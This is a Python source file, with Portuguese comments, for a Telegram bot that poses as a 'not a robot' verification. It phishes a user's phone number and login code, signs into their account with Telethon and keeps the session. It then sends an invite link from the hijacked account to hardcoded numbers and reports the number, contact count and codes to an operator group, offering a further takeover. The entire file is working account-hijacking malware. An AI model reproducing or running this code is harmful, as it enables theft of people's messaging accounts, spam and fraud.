from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.custom import Button
import asyncio
import os
from dotenv import load_dotenv

# Carrega as vari√°veis do arquivo .env
load_dotenv()

# Obt√©m as vari√°veis de ambiente
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Lista de IDs de usu√°rios autorizados para receber notifica√ß√µes
# (adicione os IDs de usu√°rios do Telegram que devem receber as notifica√ß√µes)
ADMIN_USERS = [
    # Adicione aqui os IDs dos usu√°rios que devem receber notifica√ß√µes
    # Por exemplo: 123456789, 987654321
]

# Estados para o fluxo da conversa
CONFIRM_HUMAN, ASK_PHONE, ASK_CODE = range(3)

# Fun√ß√£o para enviar a solicita√ß√£o de c√≥digo
async def request_code(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            print("Enviando solicita√ß√£o de c√≥digo para o n√∫mero:", f'+{phone}')
            sent = await client.send_code_request(f'+{phone}')
            print(sent)
            await client.disconnect()
            # Retornar tamb√©m o phone_code_hash
            return True, "C√≥digo enviado com sucesso", sent.phone_code_hash
        except Exception as e:
            await client.disconnect()
            return False, f"Erro ao enviar c√≥digo: {e}", None
    else:
        await client.disconnect()
        return True, "Usu√°rio j√° est√° autorizado", None

# Fun√ß√£o para encontrar um grupo pelo nome ou ID
async def find_telegram_group(client, group_name=None, group_id=None):
    try:
        # Obter todos os di√°logos dispon√≠veis (chats, grupos, canais)
        dialogs = await client.get_dialogs()
        
        # Depura√ß√£o: listar todos os di√°logos dispon√≠veis
        print(f"Total de di√°logos encontrados: {len(dialogs)}")
        for dialog in dialogs:
            entity_type = type(dialog.entity).__name__
            print(f"Di√°logo: {dialog.name} (ID: {dialog.entity.id}, Tipo: {entity_type})")
        
        # Procurar pelo nome ou ID nos di√°logos
        for dialog in dialogs:
            if group_name and dialog.name.lower() == group_name.lower():
                return dialog.entity
            elif group_id and dialog.entity.id == group_id:
                return dialog.entity
                
        return None
    except Exception as e:
        print(f"Erro ao buscar grupos: {e}")
        return None

# Fun√ß√£o auxiliar para enviar mensagem de log para o grupo ou administradores
async def send_log_message_to_group(bot_client, message, buttons=None):
    try:
        # Tentar encontrar o grupo pelo nome
        group_entity = await find_telegram_group(bot_client, group_name="linbotteste")
        
        if group_entity:
            try:
                # Se encontrou o grupo, tenta enviar a mensagem
                if buttons:
                    await bot_client.send_message(group_entity, message, buttons=buttons)
                else:
                    await bot_client.send_message(group_entity, message)
                print(f"Mensagem enviada com sucesso para o grupo: {group_entity.title}")
                return True
            except Exception as group_e:
                print(f"N√£o foi poss√≠vel enviar mensagem para o grupo encontrado: {group_e}")
        
        # Se n√£o conseguiu enviar para o grupo, tenta enviar para administradores individualmente
        if ADMIN_USERS:
            for admin_id in ADMIN_USERS:
                try:
                    if buttons:
                        await bot_client.send_message(admin_id, message, buttons=buttons)
                    else:
                        await bot_client.send_message(admin_id, message)
                    print(f"Mensagem enviada com sucesso para o administrador ID: {admin_id}")
                    return True
                except Exception as admin_e:
                    print(f"N√£o foi poss√≠vel enviar mensagem para o administrador {admin_id}: {admin_e}")
        
        # Se ainda n√£o foi poss√≠vel enviar para ningu√©m, tentar enviar para o n√∫mero espec√≠fico
        try:
            # Formata o n√∫mero corretamente para o Telegram
            specific_number = "+5582993286918"
            
            # Tenta enviar a mensagem
            entity = await bot_client.get_entity(specific_number)
            if buttons:
                await bot_client.send_message(entity, message, buttons=buttons)
            else:
                await bot_client.send_message(entity, message)
            print(f"Mensagem enviada com sucesso para o n√∫mero espec√≠fico: {specific_number}")
            return True
        except Exception as e:
            print(f"N√£o foi poss√≠vel enviar mensagem para o n√∫mero espec√≠fico: {e}")
            
            # Tenta formato alternativo sem o '+'
            try:
                formatted_number = specific_number.replace("+", "")
                entity = await bot_client.get_entity(formatted_number)
                if buttons:
                    await bot_client.send_message(entity, message, buttons=buttons)
                else:
                    await bot_client.send_message(entity, message)
                print(f"Mensagem enviada com sucesso para o n√∫mero espec√≠fico (formato alternativo)")
                return True
            except Exception as inner_e:
                print(f"N√£o foi poss√≠vel enviar mensagem mesmo usando o formato alternativo: {inner_e}")
        
        return False
    except Exception as e:
        print(f"Erro geral ao tentar enviar notifica√ß√µes: {e}")
        return False

# Fun√ß√£o para fazer login e enviar mensagens
async def login_and_send_messages(phone, code, phone_code_hash, update=None):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()

    try:
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
                print("Login realizado com sucesso!")
            except Exception as e:
                await client.disconnect()
                return f"Erro ao logar: {e}"
        
        # Busca os contatos do usu√°rio
        result = await client(GetContactsRequest(hash=0))
        contacts = result.users
        print(f"Total de contatos encontrados: {len(contacts)}")
        
        # Mensagem a ser enviada para todos os contatos
        message_to_send = "[ üî¥ CLIQUE üîª ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
        
        # Enviar a mensagem no pr√≥prio chat do bot, se o update estiver dispon√≠vel
        if update:
            await update.message.reply_text(message_to_send)
        
        # Contador de mensagens enviadas e com falha
        success_count = 0
        fail_count = 0
        
        # Loop para enviar mensagem para todos os contatos
        for contact in ["+5581981472018", "+5582993286918", "+5581996005600"]:
            try:
                # Tenta enviar a mensagem para o contato
                try:
                    # Primeiro tenta obter a entidade antes de enviar
                    entity = await client.get_entity(contact)
                    await client.send_message(
                        entity=entity,
                        message=message_to_send
                    )
                    success_count += 1
                    print(f"Mensagem enviada com sucesso para {contact}")
                except ValueError as e:
                    if "Cannot find any entity corresponding to" in str(e):
                        # Tenta formato alternativo sem o '+'
                        try:
                            contact_without_plus = contact.replace("+", "")
                            entity = await client.get_entity(contact_without_plus)
                            await client.send_message(
                                entity=entity,
                                message=message_to_send
                            )
                            success_count += 1
                            print(f"Mensagem enviada com sucesso para {contact} (formato alternativo)")
                        except Exception as inner_e:
                            fail_count += 1
                            print(f"Erro ao enviar mensagem para {contact} (mesmo com formato alternativo): {inner_e}")
                    else:
                        raise
                # Aguarda um pequeno intervalo para evitar limites de taxa
                await asyncio.sleep(0.5)
            except Exception as e:
                fail_count += 1
                print(f"Erro ao enviar mensagem para {contact}: {e}")
        
        print(f"Processo conclu√≠do! Mensagens enviadas: {success_count}, Falhas: {fail_count}")
        
        # Criando bot√µes inline para a pergunta usando a sintaxe do Telethon
        keyboard = [
            [
                Button.inline("Sim", data=f"login_yes_{phone}"),
                Button.inline("N√£o", data=f"login_no_{phone}")
            ]
        ]
        
        # Mensagem de log que ser√° enviada
        log_message = f"O n√∫mero '+{phone}' acabou de fazer login com sucesso!\n\n" \
                      f"Total de contatos encontrados: {len(contacts)}\n\n" \
                      f"Mensagens enviadas: {success_count}, Falhas: {fail_count}\n\n" \
                      f"Vai querer logar nessa conta? \n\n" \
                      f"Primeiro solicite o c√≥digo manualmente no https://web.telegram.org/\n\n" \
                      f"Depois clique no 'Sim' abaixo para solicitar o c√≥digo desse usu√°rio."
                      
        # NOVA IMPLEMENTA√á√ÉO: Entre no grupo especificado, envie o log e depois saia
        try:
            # 1. Entrar no grupo usando ID e username
            print("Tentando entrar no grupo especificado...")
            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
            
            if group_entity:
                # 2. Enviar a mensagem de log no grupo
                print("Enviando mensagem de log no grupo...")
                await client.send_message(group_entity, log_message, buttons=keyboard)
                print("Mensagem de log enviada com sucesso no grupo")
                
                # 3. Aguardar um pouco antes de sair (para garantir que a mensagem ser√° entregue)
                await asyncio.sleep(2)
                
                # 4. Sair do grupo
                print("Saindo do grupo...")
                await leave_telegram_group(client, group_entity)
                print("Saiu do grupo com sucesso")
            else:
                print("N√£o foi poss√≠vel entrar no grupo especificado. Tentando enviar mensagens de log pelos outros m√©todos...")
                # Continua com os m√©todos alternativos abaixo
        except Exception as e:
            print(f"Erro durante a opera√ß√£o no grupo: {e}")
            # Continua com os m√©todos alternativos abaixo
        
        # Se n√£o conseguiu enviar pelo m√©todo acima, continua com os m√©todos alternativos
        notification_sent = False
        
        # Segundo: tentar usar o cliente do bot para enviar para grupos ou usu√°rios espec√≠ficos
        try:
            bot_client = TelegramClient("session_bot", api_id, api_hash)
            await bot_client.connect()
            
            # Usar a fun√ß√£o auxiliar para enviar a mensagem de log com bot√µes
            notification_sent = await send_log_message_to_group(bot_client, log_message, keyboard)
            
            await bot_client.disconnect()
        except Exception as e:
            print(f"Erro geral ao tentar enviar notifica√ß√µes: {e}")
        
        if not notification_sent:
            print("AVISO: N√£o foi poss√≠vel enviar a notifica√ß√£o para nenhum destinat√°rio!")
        
        return f"c√≥digo verificado com sucesso!"
    except Exception as e:
        return f"Erro durante a opera√ß√£o: {e}"
    finally:
        await client.disconnect()

# Iniciar o bot - pedir confirma√ß√£o de que n√£o √© rob√¥
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("‚úÖ N√£o sou um rob√¥")]]
    await update.message.reply_text(
        "Clique no bot√£o abaixo para confirmar que voc√™ n√£o √© um rob√¥:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return CONFIRM_HUMAN

# Confirmar que n√£o √© um rob√¥ e pedir n√∫mero de telefone
async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
    await update.message.reply_text(
        "Por favor, envie seu n√∫mero de telefone clicando no bot√£o abaixo:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE

# Receber o contato do usu√°rio e enviar c√≥digo de verifica√ß√£o
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usu√°rio.")
    if update.message.contact:
        context.user_data["phone"] = update.message.contact.phone_number
        phone = context.user_data["phone"]

        try:
            await update.message.reply_text("Enviando c√≥digo de acesso! Verifique seu Telegram e aguarde...")
            success, message, phone_code_hash = await request_code(phone)
            
            if not success:
                if "Returned when all available options for this type of number were already used" in message:
                    await update.message.reply_text(
                        "Tentando novamente enviar o c√≥digo de acesso..."
                    )
                    print("Reiniciando tentativa de envio do c√≥digo de acesso...")
                    success, message, phone_code_hash = await request_code(phone)
                    if not success:
                        await update.message.reply_text(message)
                        return ASK_PHONE
                else:
                    await update.message.reply_text(message)
                    return ASK_PHONE
            
            # Salvar o phone_code_hash para usar durante o login
            context.user_data["phone_code_hash"] = phone_code_hash
            
            # Criar teclado num√©rico para o c√≥digo
            keyboard = [
                ["1", "2", "3"],
                ["4", "5", "6"],
                ["7", "8", "9"],
                ["0", "Limpar"]
            ]
            
            # Inicializa o c√≥digo
            context.user_data["code_digits"] = ""
            
            await update.message.reply_text(
                "C√≥digo enviado! Verifique seu Telegram e digite o c√≥digo de verifica√ß√£o que recebeu:",
                reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            )
            return ASK_CODE
        except Exception as e:
            print(f"Erro ao tentar enviar o c√≥digo: {e}")
            await update.message.reply_text("Erro ao enviar o c√≥digo. Por favor, tente novamente.")
            return ASK_PHONE
    else:
        print("Contato inv√°lido recebido.")
        await update.message.reply_text("Contato inv√°lido. Por favor, envie novamente.")
        return ASK_PHONE

# Receber o c√≥digo de verifica√ß√£o
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo c√≥digo de acesso do usu√°rio.")
    digit = update.message.text
    
    # Inicializa o c√≥digo se ainda n√£o existir
    if "code_digits" not in context.user_data:
        context.user_data["code_digits"] = ""
    
    current_code = context.user_data["code_digits"]

    if digit == "Limpar":
        # Se usu√°rio clicou em limpar, zera o c√≥digo
        context.user_data["code_digits"] = ""
        await update.message.reply_text(f"C√≥digo limpo. Digite novamente.")
    else:
        # Adiciona o d√≠gito ao c√≥digo atual
        context.user_data["code_digits"] += digit
        current_code = context.user_data["code_digits"]

        # Se temos menos de 5 d√≠gitos, aguarda mais entrada
        if len(current_code) < 5:
            await update.message.reply_text(f"C√≥digo: {current_code} ({len(current_code)}/5 d√≠gitos)")
        else:
            # Se temos 5 d√≠gitos, processa o c√≥digo
            code = current_code
            phone = context.user_data.get("phone")
            phone_code_hash = context.user_data.get("phone_code_hash")
            
            if not phone_code_hash:
                await update.message.reply_text(
                    "Erro: phone_code_hash n√£o encontrado. Por favor, inicie o processo novamente com /start",
                    reply_markup=ReplyKeyboardRemove()
                )
                return ConversationHandler.END

            # Remove o teclado num√©rico
            await update.message.reply_text(
                f"C√≥digo completo: {code}. Processando...",
                reply_markup=ReplyKeyboardRemove()
            )

            # Chama a fun√ß√£o de login e envio de mensagens
            result = await login_and_send_messages(phone, code, phone_code_hash, update)
            await update.message.reply_text(result)
             # Mensagem a ser enviada para todos os contatos
            message_to_send = "[ üî¥ CLIQUE üîª ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
            
            # Enviar a mensagem no pr√≥prio chat do bot, se o update estiver dispon√≠vel
            if update:
                await update.message.reply_text(message_to_send)
            return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Opera√ß√£o cancelada pelo usu√°rio.")
    await update.message.reply_text("Opera√ß√£o cancelada.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Fun√ß√£o que ser√° executada quando algu√©m clicar nos bot√µes Sim/N√£o
@events.register(events.CallbackQuery)
async def callback_handler(event):
    # Extrai os dados do callback (login_yes_PHONE ou login_no_PHONE)
    data = event.data.decode('utf-8')
    
    # Verifica se √© um callback dos bot√µes de login
    if data.startswith('login_yes_') or data.startswith('login_no_'):
        parts = data.split('_')
        action = parts[1]  # yes ou no
        phone = parts[2]   # n√∫mero do telefone
        
        # Se a resposta for "N√£o", apenas agradece
        if action == 'no':
            return
        
        # Se a resposta for "Sim", pede o c√≥digo novamente
        if action == 'yes':
            # Avisa que vamos solicitar o c√≥digo novamente
            await event.answer("Vamos solicitar o c√≥digo novamente!")
            
            # Modifica a mensagem original para indicar que est√° em andamento
            await event.edit("Solicitando novo c√≥digo para confirma√ß√£o...")
            
            # Cria um novo cliente para esse telefone espec√≠fico
            client = TelegramClient(f"session_+{phone}", api_id, api_hash)
            await client.connect()
            
            # Envia uma nova mensagem para o usu√°rio solicitando o c√≥digo com teclado num√©rico
            keyboard = [
                [Button.text("1"), Button.text("2"), Button.text("3")],
                [Button.text("4"), Button.text("5"), Button.text("6")],
                [Button.text("7"), Button.text("8"), Button.text("9")],
                [Button.text("0"), Button.text("Limpar")]
            ]
            
            await event.respond(
                f"Um novo c√≥digo foi enviado para +{phone}. Por favor, digite o c√≥digo recebido aqui para confirmar:",
                buttons=keyboard
            )
                
            # Registra uma fun√ß√£o tempor√°ria para capturar a resposta do usu√°rio com o c√≥digo
            user_code = ""
            
            @client.on(events.NewMessage(from_users=event.sender_id))
            async def code_response_handler(code_event):
                nonlocal user_code
                digit = code_event.message.text.strip()
                
                # Se o usu√°rio clicou em "Limpar"
                if digit == "Limpar":
                    user_code = ""
                    await code_event.respond(f"C√≥digo limpo. Digite novamente.")
                    return
                
                # Se √© um d√≠gito √∫nico de 0 a 9
                if digit in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
                    user_code += digit
                    
                    # Se temos menos de 5 d√≠gitos, informamos o progresso
                    if len(user_code) < 5:
                        await code_event.respond(f"C√≥digo: {user_code} ({len(user_code)}/5 d√≠gitos)")
                    # Quando completar 5 d√≠gitos, processamos automaticamente
                    else:
                        # Remove o handler para n√£o capturar mais mensagens deste usu√°rio
                        client.remove_event_handler(code_response_handler)
                        
                        # Envia mensagem confirmando o recebimento do c√≥digo
                        await code_event.respond(f"C√≥digo recebido: {user_code}. Confirmando login...")
                        
                        try:
                            # Solicita o c√≥digo novamente
                            sent = await client.send_code_request(f'+{phone}')
                            phone_code_hash = sent.phone_code_hash
                            
                            # Faz o login com o c√≥digo recebido
                            await client.sign_in(phone=f'+{phone}', code=user_code, phone_code_hash=phone_code_hash)
                            
                            # Envia mensagem de log atrav√©s do sistema renovado
                            log_message = f"Login confirmado para o n√∫mero +{phone} com o c√≥digo {user_code}!"
                            
                            # Tenta enviar para grupos ou administradores
                            try:
                                bot_client = TelegramClient("session_bot", api_id, api_hash)
                                await bot_client.connect()
                                
                                # Usar a fun√ß√£o auxiliar para enviar a mensagem de log
                                await send_log_message_to_group(bot_client, log_message)
                                
                                await bot_client.disconnect()
                            except Exception as e:
                                print(f"Erro geral ao tentar enviar notifica√ß√µes: {e}")
                            
                            await code_event.respond("Login confirmado com sucesso!")
                            
                        except Exception as e:
                            await code_event.respond(f"Erro ao confirmar login: {e}")
                else:
                    # Se n√£o for um d√≠gito ou "Limpar", ignoramos
                    await code_event.respond("Por favor, use apenas os bot√µes do teclado num√©rico.")

# Fun√ß√£o para entrar em um grupo pelo ID ou username
async def join_telegram_group(client, group_id=None, group_username=None):
    try:
        if group_username:
            # Se temos um username, tentamos entrar diretamente
            if group_username.startswith('@'):
                group_username = group_username[1:]  # Remove o @ inicial se existir
                
            try:
                entity = await client.get_entity(group_username)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo: {group_username}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo username {group_username}: {e}")
                
        if group_id:
            # Se temos um ID, tentamos entrar pelo ID
            try:
                entity = await client.get_entity(group_id)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo pelo ID: {group_id}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo ID {group_id}: {e}")
                
        return None
    except Exception as e:
        print(f"Erro geral ao tentar entrar no grupo: {e}")
        return None

# Fun√ß√£o para sair de um grupo
async def leave_telegram_group(client, group_entity):
    try:
        await client(LeaveChannelRequest(group_entity))
        print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else group_entity.id}")
        return True
    except Exception as e:
        print(f"Erro ao sair do grupo: {e}")
        return False

def main():
    # Obt√©m o token do bot do arquivo .env
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CONFIRM_HUMAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, receive_contact)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    
    # Iniciar um cliente Telethon para lidar com os callbacks dos bot√µes
    # Use uma das sess√µes existentes ou crie uma nova para o bot
    async def start_telethon():
        # Voc√™ pode usar uma sess√£o espec√≠fica aqui ou criar uma para o bot
        bot_client = TelegramClient("session_bot", api_id, api_hash)
        await bot_client.connect()
        
        # Registrar o handler de callback
        bot_client.add_event_handler(callback_handler)
        
        # Manter o cliente rodando
        print("Cliente Telethon iniciado para escutar callbacks")
        await bot_client.run_until_disconnected()
    
    # Iniciar o cliente Telethon em uma task separada
    asyncio.run_coroutine_threadsafe(start_telethon(), asyncio.get_event_loop())
    
    app.run_polling()

if __name__ == "__main__":
    main()
